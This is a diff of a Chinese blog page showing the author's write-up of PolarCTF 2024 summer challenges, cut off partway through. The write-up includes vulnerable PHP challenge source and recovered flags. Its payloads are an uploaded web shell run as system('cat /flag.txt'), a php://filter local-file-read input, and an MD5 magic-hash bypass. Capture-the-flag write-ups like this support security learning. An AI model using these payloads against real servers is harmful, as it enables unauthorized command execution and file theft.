@@ -1,324 +1,308 @@
-<!--
-	作者：Sariay
-	时间：2018-08-26
-	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
--->
+
+
 <!DOCTYPE html>
-<html class="html-loading">
-		
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
-	<meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <title>
-    
-      PolarCTF2024夏季个人挑战赛全wp | Infernity&#39;s Blog
-    
-  </title>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
   <meta name="author" content="Infernity">
-  <meta name="keywords" content="" />
-  <meta name="description" content="blog" />
-	<!-- favicon -->
-  <link rel="shortcut icon" href="/img/I.png">
-
-  <!-- css -->
+  <meta name="keywords" content="">
   
-<link rel="stylesheet" href="/css/Annie.css">
-
+    <meta name="description" content="扫扫看不用扫，猜测是flag.php   flag{094c9cc14068a7d18ccd0dd3606e532f}  debudaoflag在cookie里：   flag{72077a55w312584wb1aaa88888cd41af}  审计1234567891011121314151617181920212223&lt;?phperror_reporting(0);include(&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PolarCTF2024夏季个人挑战赛全wp">
+<meta property="og:url" content="http://example.com/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="扫扫看不用扫，猜测是flag.php   flag{094c9cc14068a7d18ccd0dd3606e532f}  debudaoflag在cookie里：   flag{72077a55w312584wb1aaa88888cd41af}  审计1234567891011121314151617181920212223&lt;?phperror_reporting(0);include(&amp;q">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/polarctf.png">
+<meta property="article:published_time" content="2024-06-10T04:05:35.000Z">
+<meta property="article:modified_time" content="2025-01-20T02:36:11.104Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/polarctf.png">
   
-  <!-- jquery -->
-	
-<script src="/plugin/jquery/jquery.min.js"></script>
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>PolarCTF2024夏季个人挑战赛全wp - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script>
-    const CONFIG_BGIMAGE = {
-      mode: 'random_you',
-      normalSrc: '/img/header-bg.jpg',
-      randomYouMax: 59,
-      randomYouSrc: '/img/background/',
-	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
-	  preloaderEnable: true
-    }
-	
-    const CONFIG_LEACLOUD_COUNT = {
-      enable: true,
-	  appId: 'AU8',
-	  appKey: '4cU',
-	  serverURLs: 'http' || ' '
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.3.0"></head>
-	<body>
-		<!-- Preloader -->
-
-	<div id="preloader">
-		<div class="pre-container">
-			
-				<div class="spinner">
-					<div class="double-bounce1"></div>
-					<div class="double-bounce2"></div>
-				</div>
-						
-		</div>
-	</div>
 
 
-<!-- header -->
-<header class="fixbackground bg-pan-br">
-	<div class="mask">
-		<!-- motto -->
-		<div class="h-body">	
-			
-				<div class="motto text-shadow-pop-left">
-					<p class="content" id="motto-content">获取中...</p>
-					<p>-<p>
-					<p class="author" id="motto-author">Just a minute...</p>
-				</div>
-			
-		</div>
-		
-		<!-- others: such as time... -->			
-		<div class="h-footer">
-			<a href="javascript:;" id="read-more" class="scroll-down">
-				<span class="icon-anchor1 animation-scroll-down"></span>
-			</a>
-		</div>
-	</div>
-</header>
+<body>
+  
 
-<div id="navigation-hide">
-	<!-- Progress bar -->
-	<div id="progress-bar"></div>
-
-	<!-- Progress percent -->
-	<div id="progress-percentage"><span>0.0%</span></div>
-
-	<div class="toc-switch"><span class="switch-button">目录</span></div>
-
-	<!-- Page title -->
-	<p>
-		
-			「PolarCTF2024夏季个人挑战赛全wp」
-		
-	</p>
-
-	
-	
-		<span id="star-button" rel="unlike">
-			<i class="icon-heart"></i>
-		</span>
-	
-
-	<!-- Nav trigger for navigation-H-->
-	<a class="nav-trigger"><span></span></a>
-</div>
-
-<!-- Navigation in div(id="navigation-H") -->
-<nav class="nav-container" id="cd-nav">
-	<div class="nav-header">
-		<span class="logo"> 
-			<img src="/img/logo.png">
-		</span>
-		<a href="javascript:;" class="nav-close"></a>
-	</div>
-	
-	<div class="nav-body">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-	
-	<div class="nav-footer">
-		<ul id="global-social">
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/qq.png" target="_blank">
-				<span class="icon-qq"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
-				<span class="icon-github"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/weixin.jpg" target="_blank">
-				<span class="icon-weixin"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
-				<span class="icon-csdn"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-instagram"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-twitter"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/atom.xml" target="_blank">
-				<span class="icon-rss"></span>
-			</a>
-		</li>
-			
-</ul>
-
-	</div>
-</nav>
-			
-		<!--main-->
-		<main>
-			<!--
-	时间：2018-11-17
-	描述：
-		插件名称：katelog.min.js
-		插件作者：KELEN
-		插件来源: https://github.com/KELEN/katelog
--->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
-	 
-
-<div class="layout-post">
-	<div id="layout-post">
-		<div class="article-title">
-			
-	<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
-		PolarCTF2024夏季个人挑战赛全wp
-	</a>
-
-		</div>
-
-		<div class="article-meta">
-			<span>
-				<i class="icon-calendar1"></i>
-				
-				
-
-
-
-
-	更新于
-
-	<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
-		<time datetime="2024-06-10T04:05:35.000Z" itemprop="dateUpdated">
-	  		2025-01-14
-	  </time>
-	</a> 
-
-
-
-			</span>
-			<span>
-				
-	<i class="icon-price-tags"></i>
-	
-		<a href="/tags/WPs/" class=" ">
-			WPs
-		</a>
-	
-		
-			</span>
-			
-			
-
-	
-    <span class="leancloud_visitors" id="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_visitors" data-url="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024夏季个人挑战赛全wp">
-       	<i class="icon-eye"></i>
-       	热度
-        
-            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
-                   
-    </span>
+  <header>
     
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">PolarCTF2024夏季个人挑战赛全wp</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-10 12:05" pubdate>
+          2024年6月10日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
 
 
-	
-    <span class="leancloud_likes" id="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_likes" data-url="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024夏季个人挑战赛全wp" rel="unlike">
-        <i class="icon-heart"></i>
-        喜欢
-        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
-    </span>
-	
+        
+      </div>
 
-		</div>
+      
+    </div>
+  </div>
+</div>
 
-		<div class="article-content" id="article-content">
-			<h1 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h1><p>不用扫，猜测是flag.php</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610123154816.png" alt="image-20240610123154816"></p>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PolarCTF2024夏季个人挑战赛全wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h1><p>不用扫，猜测是flag.php</p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610123154816.png" srcset="/img/loading.gif" lazyload alt="image-20240610123154816"></p>
 <blockquote>
 <p>flag{094c9cc14068a7d18ccd0dd3606e532f}</p>
 </blockquote>
 <h1 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h1><p>flag在cookie里：</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124209641.png" alt="image-20240610124209641"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124209641.png" srcset="/img/loading.gif" lazyload alt="image-20240610124209641"></p>
 <blockquote>
 <p>flag{72077a55w312584wb1aaa88888cd41af}</p>
 </blockquote>
-<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入类型不允许为数组。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^0e[0-9]+$/&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$input</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入必须是数字。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;恭喜：&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;错误：必须设置正确参数。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入类型不允许为数组。&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^0e[0-9]+$/&quot;</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$input</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：输入必须是数字。&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;恭喜：&quot;</span>.<span class="hljs-variable">$flag</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：必须设置正确参数。&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
 
 <p>根据题意，我们需要输入纯数字进去，然后md5加密后是0e+数字的组合。</p>
 <p>240610708的md5加密后是0e462097431906509019562988736854</p>
@@ -326,55 +310,55 @@
 <blockquote>
 <p>flag{1bc29b36f623ba82aaf6724fd3b16718}</p>
 </blockquote>
-<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124841926.png" alt="image-20240610124841926"></p>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124841926.png" srcset="/img/loading.gif" lazyload alt="image-20240610124841926"></p>
 <p>是前端检测，抓包传</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124951222.png" alt="image-20240610124951222"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610124951222.png" srcset="/img/loading.gif" lazyload alt="image-20240610124951222"></p>
 <p>进入123.php post传参：123&#x3D;system(“cat &#x2F;flag.txt”);</p>
 <blockquote>
 <p>flag{adbf5a778175ee757c34d0eba4e932bc}</p>
 </blockquote>
 <h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>还是在cookie里，什么了色题？</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610125659356.png" alt="image-20240610125659356"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610125659356.png" srcset="/img/loading.gif" lazyload alt="image-20240610125659356"></p>
 <blockquote>
 <p>flag{72077a551386b19fb1aea77814cd41af}</p>
 </blockquote>
 <h1 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h1><p>真傻逼，这题目输入3会报sql的错，但是这道题跟sql一点关系也没有，看wp才知道是普通的伪协议读文件他妈的真的</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610131343532.png" alt="image-20240610131343532"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610131343532.png" srcset="/img/loading.gif" lazyload alt="image-20240610131343532"></p>
 <p>我说我怎么输，都会报twothree’的错草</p>
 <p>源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;twothree&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;1&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;2&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;twothree&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>	<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;1&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;2&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>		<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>真傻逼</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twothree=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
